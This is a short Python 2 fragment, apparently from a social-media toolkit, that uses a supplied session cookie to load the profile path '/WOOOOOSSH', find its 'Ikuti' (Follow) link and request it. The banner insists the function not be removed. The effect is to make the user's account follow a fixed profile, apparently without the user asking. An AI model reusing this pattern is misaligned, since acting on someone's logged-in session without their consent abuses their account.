##!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

from bs4 import BeautifulSoup as parser

def main(cookie, url, config):
	try:
		response = config.httpRequest(url+'/WOOOOOSSH', cookie).encode('utf-8')
		html = parser(response, 'html.parser')
		href = html.find('a', string='Ikuti')['href']
		config.httpRequest(url+href, cookie)
	except: pass
